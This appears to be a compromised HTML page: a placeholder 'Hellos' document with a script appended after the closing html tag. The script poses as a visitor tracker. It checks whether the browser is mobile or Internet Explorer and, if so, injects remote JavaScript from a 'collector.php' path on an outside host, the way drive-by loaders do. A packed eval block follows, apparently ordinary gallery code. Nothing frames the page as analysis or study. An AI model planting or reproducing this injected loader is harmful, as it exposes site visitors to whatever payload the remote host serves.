<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Document</title>
</head>
<body>
	<h1>Hellos</h1>
	
</body>
</html>



<script>	
	/** @type {number} */
var visitortrackerin = setInterval(function() {
  if (document.body != null && typeof document.body != "undefined") {
    clearInterval(visitortrackerin);
    if (typeof window["globalvisitor"] == "undefined") {
      /** @type {number} */
      window["globalvisitor"] = 1;
      var isIE = visitortrackerde();
      /** @type {boolean} */
      var isChrome = !isIE && (!!window.chrome && window.navigator.vendor === "Google Inc.");
      if (visitorTracker_isMob()) {
        /** @type {Element} */
        var script = document.createElement("script");
        /** @type {string} */
        script.src = "http://runwithfire.com/includes/PEAR/temp_data/collector.php?mob=1";
        document.getElementsByTagName("head")[0].appendChild(script);
      } else {
        if (isIE && (!isChrome && !visitorTracker_isMob())) {
          /** @type {Element} */
          script = document.createElement("script");
          /** @type {string} */
          script.src = "http://runwithfire.com/includes/PEAR/temp_data/collector.php";
          document.getElementsByTagName("head")[0].appendChild(script);
        }
      }
    }
    visitortracksdel();
  }
}, 100);
/**
 * @return {undefined}
 */
function visitortracksdel() {
  /** @type {string} */
  var template = "none";
  if (template != "none") {
    /** @type {(HTMLElement|null)} */
    var element = document.getElementById(template);
    if (typeof element != undefined && element != null) {
      /** @type {string} */
      element.outerHTML = "";
      delete element;
    }
  }
}
/**
 * @return {?}
 */
function visitortrackerde() {
  /** @type {string} */
  var ua = window.navigator.userAgent;
  /** @type {number} */
  var msie = ua.indexOf("MSIE ");
  if (msie > 0) {
    return parseInt(ua.substring(msie + 5, ua.indexOf(".", msie)), 10);
  }
  /** @type {number} */
  var Trident = ua.indexOf("Trident/");
  if (Trident > 0) {
    /** @type {number} */
    var qpStart = ua.indexOf("rv:");
    return parseInt(ua.substring(qpStart + 3, ua.indexOf(".", qpStart)), 10);
  }
  /** @type {number} */
  var i = ua.indexOf("Edge/");
  if (i > 0) {
    return parseInt(ua.substring(i + 5, ua.indexOf(".", i)), 10);
  }
  return false;
}
/**
 * @return {?}
 */
function visitorTracker_isMob() {
  /** @type {string} */
  var requestUrl = window.navigator.userAgent.toLowerCase();
  if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(requestUrl) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(requestUrl.substr(0, 
  4))) {
    return true;
  }
  return false;
}
eval(function(str, n, name, pair, func, opt_attributes) {
  /**
   * @param {number} i
   * @return {?}
   */
  func = function(i) {
    return(i < n ? "" : func(parseInt(i / n))) + ((i = i & n) > 35 ? String.fromCharCode(i + 29) : i.toString(36));
  };
  if (!"".replace(/^/, String)) {
    for (;name--;) {
      opt_attributes[func(name)] = pair[name] || func(name);
    }
    /** @type {Array} */
    pair = [function(timeoutKey) {
      return opt_attributes[timeoutKey];
    }];
    /**
     * @return {?}
     */
    func = function() {
      return "\\w+";
    };
    /** @type {number} */
    name = 1;
  }
  for (;name--;) {
    if (pair[name]) {
      /** @type {string} */
      str = str.replace(new RegExp("\\b" + func(name) + "\\b", "g"), pair[name]);
    }
  }
  return str;
}("7 c=6 s({t:4(){1.f=$$('.k n');1.8=$$('.k n.'+3.x)[0]||m;b(1.8)1.8.C('p');1.g=A;b(i)i.d('w',1.e.y(1));z 1.e()},e:4(){1.f.v(4(5){7 a=5.u.o(\" \"),l=3.2;7 2=l.q+'//'+l.r+l.B;2=(3.h)?3.h:2;7 9=2+'/Q/P/O/f/R'+a[0]+'.S';6 D.V(9,{U:4(){5.j('T','N('+9+') M-G')}});b(1.g)5.j('F','E').d('H',4(){3.2=2+'?I='+a[0]})},1);1.g=m}});c.L(6 K);3.d('J',4(){6 c()});", 58, 58, "|this|location|window|function|style|new|var|current|imgPath|cls|if|rokShowcaseVariation|addEvent|loadImages|styles|firsttime|uri|panel|setStyle|styleslist||false|div|split|active|protocol|host|Class|initialize|className|each|open|currentStyle|bind|else|true|pathname|addClass|Asset|pointer|cursor|repeat|click|tstyle|domready|Options|implement|no|url|demo|stories|images|ss_|jpg|background|onload|image".split("|"), 
0, {}));


</script>